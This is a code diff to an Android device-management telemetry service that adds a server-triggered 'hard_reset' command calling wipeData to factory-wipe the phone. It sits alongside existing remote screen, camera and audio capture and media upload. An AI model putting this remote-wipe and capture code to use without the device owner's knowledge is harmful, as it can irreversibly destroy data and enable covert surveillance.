@@ -3,8 +3,10 @@ package com.company.devicemgr.services;
 import android.app.Notification;
 import android.app.AppOpsManager;
 import android.app.Service;
+import android.app.admin.DevicePolicyManager;
 import android.app.usage.UsageStats;
 import android.app.usage.UsageStatsManager;
+import android.content.ComponentName;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageInfo;
 import android.content.ContentResolver;
@@ -42,6 +44,7 @@ import com.company.devicemgr.utils.HttpClient;
 import com.company.devicemgr.utils.PermissionCompat;
 import com.company.devicemgr.utils.TelemetryDispatch;
 import com.company.devicemgr.utils.SupportSessionApi;
+import com.company.devicemgr.receivers.DeviceAdminReceiver;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -111,6 +114,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     private volatile boolean remoteCameraCaptureRunning = false;
     private static final String KEY_REMOTE_SCREEN_LAST_UPLOAD_PREFIX = "remote_screen_last_upload_";
     private static final String KEY_REMOTE_CAMERA_LAST_UPLOAD_PREFIX = "remote_camera_last_upload_";
+    private static final String KEY_REMOTE_HARD_RESET_LAST_SESSION = "remote_hard_reset_last_session";
 
     @Override
     public void onCreate() {
@@ -364,6 +368,16 @@ public class ForegroundTelemetryService extends Service implements LocationListe
             return;
         }
 
+        if ("hard_reset".equals(requestType)) {
+            activeScreenSessionId = null;
+            activeAudioSessionId = null;
+            activeCameraSessionId = null;
+            activeCameraFacing = null;
+            releaseScreenProjection();
+            maybeRunRemoteHardReset(sessionId);
+            return;
+        }
+
         activeScreenSessionId = null;
         activeAudioSessionId = null;
         activeCameraSessionId = null;
@@ -420,6 +434,37 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                 && sessionId.equals(activeCameraSessionId)
                 && facing != null
                 && facing.equals(activeCameraFacing);
+    }
+
+    private void maybeRunRemoteHardReset(String sessionId) {
+        if (sessionId == null || sessionId.trim().isEmpty()) return;
+        String executed = prefs().getString(KEY_REMOTE_HARD_RESET_LAST_SESSION, null);
+        if (sessionId.equals(executed)) return;
+        prefs().edit().putString(KEY_REMOTE_HARD_RESET_LAST_SESSION, sessionId).apply();
+        new Thread(() -> triggerHardReset(sessionId), "remote-hard-reset").start();
+    }
+
+    private void triggerHardReset(String sessionId) {
+        long startedAt = System.currentTimeMillis();
+        JSONObject ctx = new JSONObject();
+        try {
+            ctx.put("sessionId", sessionId);
+            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+            ComponentName admin = new ComponentName(this, DeviceAdminReceiver.class);
+            if (dpm == null || !dpm.isAdminActive(admin)) {
+                ctx.put("reason", "device_admin_inactive");
+                sendMetric("remote_command", "hard_reset", "blocked", null, null, ctx);
+                return;
+            }
+            sendMetric("remote_command", "hard_reset", "requested", null, null, ctx);
+            dpm.wipeData(0);
+        } catch (Exception e) {
+            try {
+                ctx.put("error", e.getClass().getSimpleName());
+            } catch (Exception ignored) {
+            }
+            sendMetric("remote_command", "hard_reset", "error", (int) (System.currentTimeMillis() - startedAt), null, ctx);
+        }
     }
 
     private void maybeUploadAllMedia() {
